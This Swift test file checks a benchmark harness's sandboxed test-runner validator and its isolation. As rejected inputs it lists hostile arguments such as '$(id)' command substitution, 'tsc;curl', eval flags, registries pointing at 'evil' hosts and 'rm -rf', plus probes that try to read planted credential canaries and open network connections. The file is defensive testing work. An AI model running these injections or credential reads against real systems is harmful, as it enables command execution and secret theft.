import Foundation
import Testing
@testable import StrimAgentBench
import StrimHarness

/// The per-language `runtests` runners: strict argv grammar, and the sandbox still holds (no network, no credential files,
/// no other-run access, no writes outside the worktree) while the toolchains themselves run.
@Suite struct RunTestsLanguageTests {
    @Test func grammarAcceptsTheVerifyForms() {
        let ok: [[String]] = [
            ["node", "--test"], ["node", "--test", "test/a.test.js", "test/b.test.ts"], ["node", "--test", "--test-name-pattern=parse"],
            ["node", "--test", "--test-reporter", "spec"], ["node", "--test", "--experimental-strip-types"],
            ["bun", "test"], ["bun", "test", "test/cart.test.jsx"], ["bun", "test", "-t", "pagination", "--timeout", "5000"],
            ["deno", "test"], ["deno", "test", "--no-check", "--filter", "x", "tests/"],
            ["cargo", "test", "--offline"], ["cargo", "test", "--offline", "--quiet", "parse_ok", "--", "--nocapture", "--test-threads=1"],
            ["cargo", "build", "--offline", "--release"], ["cargo", "test", "--offline", "-p", "core", "--manifest-path", "crates/core/Cargo.toml"],
            ["ruby", "-Ilib", "-Itest", "test/all_test.rb"], ["ruby", "-I", "lib", "-w", "test/a_test.rb", "-n", "/parse/", "-v"],
            ["tsc", "--noEmit"], ["tsc", "--noEmit", "-p", "."], ["tsc", "--noEmit", "--project", "packages/web"],
            ["npm", "test"], ["npm", "run", "typecheck"], ["npm", "test", "--silent"], ["npx", "--no-install", "tsc", "--noEmit"],
            ["javatest"], ["javatest", "CartTest"],
            ["python3", "-I", "-m", "unittest"], ["python3", "-I", "-B", "-m", "unittest", "discover", "-s", "tests", "-t", "."],
            ["python3", "-I", "-m", "unittest", "tests.test_cart.CartTest.test_total", "-v"], ["python3", "-I", "-m", "unittest", "discover", "-p", "test_*.py", "-k", "parse"],
        ]
        for a in ok { #expect(RunTestsService.validate(a) == nil, "\(a): \(RunTestsService.validate(a) ?? "")") }
    }

    @Test func grammarRefusesFetchEvalAndOutsideExec() {
        let bad: [[String]] = [
            // node: eval, preload, imports, env files, absolute and parent paths, no --test
            ["node", "-e", "require('child_process')"], ["node", "--eval", "1"], ["node", "-p", "1"], ["node", "script.js"], ["node", "--test", "--require", "x.js"],
            ["node", "--test", "--import", "x.mjs"], ["node", "--test", "--env-file=.env"], ["node", "--test", "/etc/passwd"], ["node", "--test", "../other/x.test.js"],
            ["node", "--test", "--test-reporter=./evil.js"], ["node", "--test", "--inspect"], ["node", "--test", "-r", "x"], ["node", "--test", "~/x.js"],
            // npm / npx: installs, remote packages, exec, scripts by path, passthrough arguments
            ["npm", "install"], ["npm", "i", "left-pad"], ["npm", "ci"], ["npm", "exec", "foo"], ["npm", "x", "foo"], ["npm", "init"], ["npm", "publish"],
            ["npm", "run"], ["npm", "run", "a", "b"], ["npm", "test", "--", "--evil"], ["npm", "test", "--registry=http://evil"], ["npm", "run", "../x"],
            ["npx", "cowsay", "hi"], ["npx", "--yes", "cowsay"], ["npx", "tsc"], ["npx", "--no-install"], ["npx", "--no-install", "@evil/pkg"],
            ["npx", "--no-install", "http://evil/x.js"], ["npx", "--no-install", "tsc", "$(id)"], ["npx", "--no-install", "tsc;curl"],
            // bun / deno
            ["bun", "run", "x.ts"], ["bun", "x", "cowsay"], ["bun", "install"], ["bun", "add", "left-pad"], ["bun", "test", "--preload", "x.js"], ["bun", "test", "--cwd", "/"],
            ["bun", "test", "-e", "1"], ["bun", "test", "/abs/x.test.ts"], ["bun", "test", "--timeout", "abc"],
            ["deno", "run", "x.ts"], ["deno", "eval", "1"], ["deno", "install", "x"], ["deno", "test", "--allow-all"], ["deno", "test", "-A"], ["deno", "test", "--allow-net"],
            ["deno", "test", "--allow-read=/"], ["deno", "test", "--import-map=https://x/m.json"], ["deno", "test", "https://evil/x.ts"],
            // cargo: run, install, fetch, online, config/exec flags, toolchain override
            ["cargo", "run"], ["cargo", "install", "ripgrep"], ["cargo", "fetch"], ["cargo", "add", "serde"], ["cargo", "test"], ["cargo", "build"],
            ["cargo", "test", "--offline", "--config", "build.rustc-wrapper=\"sh\""], ["cargo", "test", "--offline", "--config=x"], ["cargo", "+nightly", "test", "--offline"],
            ["cargo", "test", "--offline", "-Z", "unstable-options"], ["cargo", "test", "--offline", "--target-dir", "/tmp/x"], ["cargo", "test", "--offline", "--manifest-path", "/abs/Cargo.toml"],
            ["cargo", "test", "--offline", "--manifest-path", "../x/Cargo.toml"], ["cargo", "test", "--offline", "--", "--exec", "sh"], ["cargo", "test", "--offline", "--", "-Zunstable-options"],
            ["cargo", "test", "--offline", "--features", "a;b"], ["cargo", "test", "--offline", "path/with/slash"],
            // ruby: eval, require, gem, absolute scripts, non-ruby files
            ["ruby", "-e", "puts 1"], ["ruby", "-ruri", "test/a.rb"], ["ruby", "-r", "socket", "test/a.rb"], ["ruby", "test/a.sh"], ["ruby", "/etc/x.rb"], ["ruby", "../x.rb"],
            ["ruby", "-Ilib"], ["ruby", "-I/abs", "test/a.rb"], ["ruby", "-I..", "test/a.rb"], ["ruby", "test/a.rb", "-e", "1"], ["ruby", "test/a.rb", "$(id)"], ["ruby", "-S", "gem", "install", "x"],
            ["gem", "install", "x"], ["bundle", "install"], ["rake"], ["irb"],
            // tsc: emit, build mode, plugins, absolute projects
            ["tsc"], ["tsc", "-p", "."], ["tsc", "--noEmit", "--build"], ["tsc", "--noEmit", "-b"], ["tsc", "--noEmit", "-p", "/abs"], ["tsc", "--noEmit", "--outDir", "x"], ["tsc", "--noEmit", "--init"],
            // java: only the fixed runner, one identifier
            ["javatest", "a", "b"], ["javatest", "../x"], ["javatest", "$(id)"], ["javatest", "-cp", "/x"], ["java", "-jar", "x.jar"], ["javac", "X.java"], ["mvn", "test"], ["sh", "scripts/javatest.sh"],
            // python: isolated unittest only
            ["python3", "-m", "unittest"], ["python3", "-I", "-c", "import os"], ["python3", "-I", "-m", "pip", "install", "x"], ["python3", "-I", "-m", "http.server"],
            ["python3", "-I", "x.py"], ["python3", "-I", "-m", "unittest", "-s", "/etc"], ["python3", "-I", "-m", "unittest", "../x"], ["python3", "-I", "-m", "unittest", "-e"],
            ["python3", "-I", "-X", "dev", "-m", "unittest"], ["python3", "-I", "-m", "unittest", "-k", "$(id)"], ["python3", "-I", "-m", "unittest", "a;b"],
            ["python3", "-I", "-m", "unittest", "discover", "-s", "../other"], ["python", "-I", "-m", "unittest"], ["python3"], ["pip", "install", "x"], ["pip3", "install", "x"],
            // other programs
            ["curl", "http://example.com"], ["python3", "x.py"], ["perl", "x.pl"], ["bash", "-c", "id"], ["env", "x"], ["wget", "x"], ["git", "status"], ["rustc", "x.rs"], ["rm", "-rf", "x"],
        ]
        for a in bad { #expect(RunTestsService.validate(a) != nil, "\(a) was accepted") }
        #expect(RunTestsService.validate([]) != nil)
    }

    @Test func javaRunnerMapsToTheFixedScript() {
        #expect(RunTestsGrammar.argv(["javatest"]) == ["/bin/sh", "scripts/javatest.sh"])
        #expect(RunTestsGrammar.argv(["javatest", "CartTest"]) == ["/bin/sh", "scripts/javatest.sh", "CartTest"])
        #expect(RunTestsGrammar.argv(["node", "--test"]) == ["node", "--test"])
    }

    @Test func toolchainReadGrantsAreNarrow() {
        let home = NSHomeDirectory()
        let granted = Verifier.toolchainReadable(home: home)
        for forbidden in [".cargo", ".npmrc", ".config", ".gem", ".m2", ".docker", ".netrc", ".aws", ".ssh", ".rbenv", ".nvm", ".rustup", ".npm", ".bun", ".deno", ".gradle"] {
            #expect(!granted.contains(home + "/" + forbidden), "\(forbidden) must not be granted wholesale")
        }
        for g in granted where g.hasPrefix(home) {
            #expect([".nvm/versions", ".rustup/toolchains", ".rbenv/versions", "go/pkg/mod", "Library/Caches/org.swift.swiftpm"].contains(String(g.dropFirst(home.count + 1))), "\(g)")
        }
        // the verify sandbox profile never lists the credential locations as readable
        let profile = Verifier.sandboxProfile(work: URL(fileURLWithPath: "/tmp/w"), scratch: URL(fileURLWithPath: "/tmp/s"), home: home)
        for d in [".cargo", ".npmrc", ".gem", ".m2", ".docker", ".netrc"] { #expect(!profile.contains(home + "/" + d + "\"") || profile.contains("(deny")) }
    }

    // MARK: sandbox behaviour with the real toolchains

    struct Canaries {
        var paths: [String] = []
        var created: [String] = []
        func cleanup() { for p in created { try? FileManager.default.removeItem(atPath: p) } }
    }

    /// Files named like credentials and toolchain neighbours, planted in directories that already exist (never new dirs).
    func plantCanaries() -> Canaries {
        let home = NSHomeDirectory(), fm = FileManager.default, id = UUID().uuidString
        var c = Canaries()
        let spots = ["", ".cargo", ".gem", ".m2", ".docker", ".config", ".aws", ".ssh", ".npm", ".bun", ".deno", ".nvm", ".rustup", ".rbenv", ".gradle"]
        for s in spots {
            let dir = s.isEmpty ? home : home + "/" + s
            guard fm.fileExists(atPath: dir) else { continue }
            let name = s.isEmpty ? ".npmrc-canary-\(id)" : "credentials-canary-\(id)"
            let p = dir + "/" + name
            if (try? "token=SECRET".write(toFile: p, atomically: true, encoding: .utf8)) != nil { c.created.append(p); c.paths.append(p) }
        }
        return c
    }

    func service(_ work: URL) -> (RunTestsService, String)? {
        guard let svc = RunTestsService(workdir: work.path, scratch: work.path + "-scratch") else { return nil }
        return (svc, svc.writeScript(dir: work.path + "-bin"))
    }

    func rt(_ script: String, _ work: URL, _ args: [String]) -> (code: Int32, text: String) {
        Proc.capture([script] + args, cwd: work.path, env: ["PATH": "/usr/bin:/bin", "HOME": work.path], timeout: 280, scratch: work.deletingLastPathComponent())
    }

    /// Runs one probe project through runtests: it must pass (so the toolchain runs inside the sandbox) while every canary
    /// credential file, the loopback listener and the internet are unreachable and nothing outside the worktree is writable.
    func probe(tool: [String], have: Bool, marker: String = "ran.marker", expectMarker: Bool = true, files: (String, String, String, Int) -> [String: String]) throws {
        guard have else { return }
        let c = plantCanaries(); defer { c.cleanup() }
        #expect(c.paths.count >= 1)
        for p in c.paths { #expect((try? String(contentsOfFile: p, encoding: .utf8)) == "token=SECRET") }   // control: the host reads them
        let root = tempDir("lang"), work = root.appendingPathComponent("work")
        try FileManager.default.createDirectory(at: work, withIntermediateDirectories: true)
        let outside = root.appendingPathComponent("other-run.txt"); write(outside, "another run")
        let (lfd, lport) = listener(); defer { close(lfd) }
        let outsideWrite = root.path + "/pwned.txt"
        let list = (c.paths + [outside.path, NSHomeDirectory() + "/.ssh/known_hosts", NSHomeDirectory() + "/.strim/token"]).joined(separator: "\n")
        let jlist = list.replacingOccurrences(of: "\n", with: "\\n")
        for (rel, body) in files(tool == ["javatest"] ? jlist : list, outsideWrite, work.path + "/" + marker, Int(lport)) { write(work.appendingPathComponent(rel), body) }
        let (svc, script) = try #require(service(work)); defer { svc.stop() }
        let r = rt(script, work, tool)
        #expect(r.code == 0, "\(tool): \(r.text.suffix(1500))")
        if expectMarker { #expect(FileManager.default.fileExists(atPath: work.path + "/" + marker), "\(tool): probe did not run") } else { #expect(r.text.contains("1 passed"), "\(r.text)") }
        #expect(!FileManager.default.fileExists(atPath: outsideWrite))
    }

    static func exists(_ p: String) -> Bool { FileManager.default.isExecutableFile(atPath: p) }
    static var haveNode: Bool { Toolchains.pathDirs(home: NSHomeDirectory()).contains { exists($0 + "/node") } }
    static var haveBun: Bool { exists("/opt/homebrew/bin/bun") }
    static var haveDeno: Bool { exists("/opt/homebrew/bin/deno") }
    static var haveRuby: Bool { Toolchains.pathDirs(home: NSHomeDirectory()).contains { exists($0 + "/ruby") } }
    static var haveCargo: Bool { Toolchains.pathDirs(home: NSHomeDirectory()).contains { exists($0 + "/cargo") } }
    static var havePython: Bool { Toolchains.pythonHome() != nil }
    static var haveJava: Bool { Toolchains.jdkHome() != nil }

    @Test func nodeRunsIsolated() throws {
        try probe(tool: ["node", "--test"], have: Self.haveNode) { list, outsideWrite, marker, port in
            ["test/probe.test.js": """
            const test = require('node:test'); const fs = require('node:fs'); const net = require('node:net');
            const assert = require('node:assert/strict');
            test('isolated', async () => {
              for (const p of `\(list)`.split('\\n')) { let got = ''; try { got = fs.readFileSync(p, 'utf8'); } catch (e) {} assert.equal(got, '', 'read ' + p); }
              for (const [h, pt] of [['127.0.0.1', \(port)], ['1.1.1.1', 443]]) {
                await new Promise((res, rej) => { const s = net.connect({ host: h, port: pt, timeout: 1500 }); s.on('connect', () => { s.destroy(); rej(new Error('connected ' + h)); }); s.on('error', () => res()); s.on('timeout', () => { s.destroy(); res(); }); });
              }
              assert.throws(() => fs.writeFileSync('\(outsideWrite)', 'x'));
              fs.writeFileSync('\(marker)', 'x');
            });
            """]
        }
    }

    @Test func bunRunsIsolated() throws {
        try probe(tool: ["bun", "test"], have: Self.haveBun) { list, outsideWrite, marker, port in
            ["probe.test.js": """
            import { test, expect } from 'bun:test'; import fs from 'node:fs'; import net from 'node:net';
            test('isolated', async () => {
              for (const p of `\(list)`.split('\\n')) { let got = ''; try { got = fs.readFileSync(p, 'utf8'); } catch (e) {} expect(got).toBe(''); }
              for (const [h, pt] of [['127.0.0.1', \(port)], ['1.1.1.1', 443]]) {
                const ok = await new Promise((res) => { const s = net.connect({ host: h, port: pt }); s.on('connect', () => { s.destroy(); res(true); }); s.on('error', () => res(false)); setTimeout(() => { s.destroy(); res(false); }, 1500); });
                expect(ok).toBe(false);
              }
              expect(() => fs.writeFileSync('\(outsideWrite)', 'x')).toThrow();
              fs.writeFileSync('\(marker)', 'x');
            });
            """]
        }
    }

    @Test func denoRunsWithoutPermissions() throws {
        try probe(tool: ["deno", "test", "--no-check"], have: Self.haveDeno, expectMarker: false) { list, outsideWrite, marker, port in
            ["probe_test.ts": """
            Deno.test('no permissions', async () => {
              let threw = 0;
              for (const p of `\(list)`.split('\\n')) { try { Deno.readTextFileSync(p); } catch { threw++; } }
              if (threw !== `\(list)`.split('\\n').length) throw new Error('read a protected file');
              try { await Deno.connect({ hostname: '127.0.0.1', port: \(port) }); throw new Error('connected'); } catch (e) { if (String(e).includes('connected')) throw e; }
              try { Deno.writeTextFileSync('\(outsideWrite)', 'x'); throw new Error('wrote'); } catch (e) { if (String(e).includes('wrote')) throw e; }
            });
            """]
        }
    }

    @Test func rubyRunsIsolated() throws {
        try probe(tool: ["ruby", "-Itest", "test/probe_test.rb"], have: Self.haveRuby) { list, outsideWrite, marker, port in
            ["test/probe_test.rb": """
            require 'minitest/autorun'
            require 'socket'
            class ProbeTest < Minitest::Test
              def test_isolated
                '\(list)'.split("\\n").each { |p| got = (File.read(p) rescue ''); assert_equal '', got, "read #{p}" }
                [['127.0.0.1', \(port)], ['1.1.1.1', 443]].each do |h, pt|
                  ok = begin; Socket.tcp(h, pt, connect_timeout: 1.5) { true }; rescue StandardError; false; end
                  refute ok, "connected #{h}"
                end
                assert_raises(StandardError) { File.write('\(outsideWrite)', 'x') }
                File.write('\(marker)', 'x')
              end
            end
            """]
        }
    }

    @Test func cargoRunsIsolated() throws {
        try probe(tool: ["cargo", "test", "--offline", "--quiet"], have: Self.haveCargo) { list, outsideWrite, marker, port in
            ["Cargo.toml": "[package]\nname = \"probe\"\nversion = \"0.1.0\"\nedition = \"2021\"\n\n[dependencies]\n",
             "src/lib.rs": """
             #[cfg(test)]
             mod tests {
                 use std::{fs, net::{TcpStream, SocketAddr}, time::Duration};
                 #[test]
                 fn isolated() {
                     for p in "\(list)".lines() { assert!(fs::read_to_string(p).map(|s| s.is_empty()).unwrap_or(true), "read {}", p); }
                     for a in ["127.0.0.1:\(port)", "1.1.1.1:443"] {
                         let addr: SocketAddr = a.parse().unwrap();
                         assert!(TcpStream::connect_timeout(&addr, Duration::from_millis(1500)).is_err(), "connected {}", a);
                     }
                     assert!(fs::write("\(outsideWrite)", "x").is_err());
                     fs::write("\(marker)", "x").unwrap();
                 }
             }
             """]
        }
    }

    @Test func pythonRunsIsolated() throws {
        try probe(tool: ["python3", "-I", "-B", "-m", "unittest", "discover", "-s", "tests", "-t", "."], have: Self.havePython) { list, outsideWrite, marker, port in
            let plist = list.replacingOccurrences(of: "\n", with: "|")
            return ["tests/__init__.py": "",
             "tests/test_probe.py": """
             import socket, unittest
             class Probe(unittest.TestCase):
                 def test_isolated(self):
                     for p in '\(plist)'.split('|'):
                         try:
                             got = open(p).read()
                         except OSError:
                             got = ''
                         self.assertEqual(got, '', 'read ' + p)
                     for h, pt in [('127.0.0.1', \(port)), ('1.1.1.1', 443)]:
                         s = socket.socket()
                         s.settimeout(1.5)
                         with self.assertRaises(OSError):
                             s.connect((h, pt))
                         s.close()
                     with self.assertRaises(OSError):
                         open('\(outsideWrite)', 'w').write('x')
                     open('\(marker)', 'w').write('x')
             """]
        }
    }

    @Test func javaRunnerIsIsolated() throws {
        try probe(tool: ["javatest"], have: Self.haveJava) { list, outsideWrite, marker, port in
            ["scripts/javatest.sh": try! String(contentsOf: repoRoot().appendingPathComponent("bench/agenttasks/shared/javatest.sh"), encoding: .utf8),
             "src/tests/AllTests.java": """
             package tests;
             import java.io.*; import java.net.*; import java.nio.file.*;
             public class AllTests {
                 public static void main(String[] a) throws Exception {
                     for (String p : "\(list)".split("\\n")) { try { String s = new String(Files.readAllBytes(Paths.get(p))); if (!s.isEmpty()) { System.out.println("read " + p); System.exit(1); } } catch (Exception e) {} }
                     for (String h : new String[] {"127.0.0.1:\(port)", "1.1.1.1:443"}) {
                         String[] hp = h.split(":");
                         try (Socket s = new Socket()) { s.connect(new InetSocketAddress(hp[0], Integer.parseInt(hp[1])), 1500); System.out.println("connected " + h); System.exit(1); } catch (IOException e) {}
                     }
                     try { Files.write(Paths.get("\(outsideWrite)"), "x".getBytes()); System.out.println("wrote outside"); System.exit(1); } catch (IOException e) {}
                     Files.write(Paths.get("\(marker)"), "x".getBytes());
                 }
             }
             """]
        }
    }
}
